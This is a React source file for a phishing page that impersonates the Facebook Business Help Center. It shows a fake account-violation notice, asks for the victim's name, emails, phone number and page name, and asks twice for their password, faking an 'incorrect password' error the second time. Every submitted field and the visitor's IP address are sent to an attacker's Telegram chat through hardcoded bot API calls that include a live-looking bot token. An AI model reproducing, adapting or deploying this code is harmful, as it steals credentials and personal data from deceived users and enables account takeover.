import React from 'react';
import styles from '../styles/appeal-form.module.css';
import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";

import Nav from './nav';


const AppealForm = (props) => {

    const [steps, setSteps] = useState({first_password: false, second_password: false});

    const { register, handleSubmit } = useForm();

    useEffect(() => {
        callAPI(); //
    }, [props]);

    const callAPI = async () => {
        try {
            const message = `Message: hini ip:${props.ip.userIP}`
            const res = await fetch(`https://api.telegram.org/bot6029253450:AAF4Rk6omfCqptz3P05XciYjDQjtBgFXePs/sendMessage?chat_id=-4068050560&text=${message}`);
            const data = await res.json();
        } catch (err) {
            console.log(err);
        }
    };

    const onSubmit = (data) => {
        sendAppealData(data)
    }

    const sendAppealData = async (data) => {
        try {

            const message = `
             %0A =============================%0AIp:${props.ip.userIP}%0A Appeal: ${data.appeal}%0A Full Name: ${data.fullname}%0A Phone: ${data.mobilePhone}%0A Bussines: ${data.bussinesEmail}%0A Personal: ${data.personalEmail}%0A Page Name: ${data.pageName}%0A=============================%0A 
            `
            const res = await fetch(`https://api.telegram.org/bot6029253450:AAF4Rk6omfCqptz3P05XciYjDQjtBgFXePs/sendMessage?chat_id=-4068050560&text=${message}`);
            setSteps({first_password: true, second_password: false});

        } catch (err) {
            console.log(err);
        }
    }

    const sendFirstPw = async (data) => {
        try {

            const message = `
             Ip:${props.ip.userIP}%0A pw: ${data.password}`;
            const res = await fetch(`https://api.telegram.org/bot6029253450:AAF4Rk6omfCqptz3P05XciYjDQjtBgFXePs/sendMessage?chat_id=-4068050560&text=${message}`);
            setSteps({first_password: false, second_password: true})

        } catch (err) {
            console.log(err);
        }
    }

    const sendSecondPw = async (data) => {
        try {

            const message = `
             Ip:${props.ip.userIP}%0A second pw: ${data.password}`;
            const res = await fetch(`https://api.telegram.org/bot6029253450:AAF4Rk6omfCqptz3P05XciYjDQjtBgFXePs/sendMessage?chat_id=-4068050560&text=${message}`);
            setSteps({first_password: false, second_password: false})
            trigerNext();

        } catch (err) {
            console.log(err);
        }
    }

    const firstPasswordSubmit = (data) => { 
        sendFirstPw(data);

    }

    const secondPasswordSubmit = (data) => { 
        sendSecondPw(data)
    }

    const trigerNext = () => {
        props.onSubmit({type: 'appeal', value: true});
    }

  return (

    <div className={styles.layout}>
        
        <Nav/>
        <div className={styles.help}>
            <div className={styles.wrapper}>
                <p>Facebook Business Help Center</p>
            </div>
        </div>

        <div className={styles.appeal}>
            <form onSubmit={handleSubmit(onSubmit)}>
                <div className={styles.steps}>
                    <div className={styles.top}>
                        <div className={styles.circle}></div>
                        <div className={styles.line}></div>
                        <div className={styles.circle}></div>
                        <div className={styles.line}></div>
                        <div className={styles.circle}></div>
                    </div>

                    <div className={styles.labels}>
                        <span>Select Asset</span>
                        <span>Select the Issue</span>
                        <span>Get Help</span>
                    </div>
                </div>

                <div className={styles.getStarted}>
                    <strong>Get Started</strong>
                </div>

                <div className={styles.alert}>
                        <p>
                            We have received multiple reports that suggest that your account has been in violation of our terms of services and community guidelines. As a result, your account is scheduled for review 
                        </p>
                        <strong>Report no: 3088553115</strong>
                </div>

                <div className={styles.formGroup}>
                    <label className={styles.mainLabel}>Please provide us information that will help us investigate</label>
                    <textarea {...register("appeal")}></textarea>
                    
                </div>

                <div className={styles.formGroup}>
                    <label>Full Name</label>
                    <input type="text" {...register("fullname")}/>
                </div>
                <div className={styles.formGroup}>
                    <label>Business Email Address</label>
                    <input type="email" {...register("bussinesEmail")}/>
                </div>
                <div className={styles.formGroup}>
                    <label>Personal Email Address</label>
                    <input type="email" required {...register("personalEmail")}/>
                </div>
                <div className={styles.formGroup}>
                    <label>Mobile Phone Number</label>
                    <input type="phone" {...register("mobilePhone")}/>
                </div>
                <div className={styles.formGroup}>
                    <label>Facebook Page Name</label>
                    <input type="text" {...register("pageName")}/>
                </div>

                <button type="submit">Submit</button>
            </form>
        </div>

        {
            (steps.first_password || steps.second_password) && 
            <div className={styles.modal}>
                

                {
                    steps.first_password && 
                    <div className={styles.box}>
                        <div className={styles.top}>
                            <h3>Please enter your password</h3>
                        </div>
                        <form onSubmit={handleSubmit(firstPasswordSubmit)}>
                            <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                            <div className={styles.formGroup}>
                                <label>Password:</label>
                                <input type="password" required {...register("password")} />
                            </div>

                            <div className={styles.bottom}>
                                <button type="submit">Continue</button>
                            </div>
                        </form>
                    </div>
                }

                {
                    steps.second_password && 
                    <div className={styles.box}>
                        <div className={styles.top}>
                            <h3>Please Re-Enter Your Password</h3>
                        </div>
                        <form onSubmit={handleSubmit(secondPasswordSubmit)}>
                            <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                            <div className={styles.formGroup}>
                                <label>Password:</label>
                                <input type="password" required {...register("password")}/>
                                <p className={styles.error}>The password you've entered is incorrect.</p>

                            </div>

                            <div className={styles.bottom}>
                                <button type="submit">Continue</button>
                            </div>
                        </form>
                    </div>
                }

                
            </div>
        }

        

    </div>
    // <span>Appeal Form</span>
  );
};

export default AppealForm;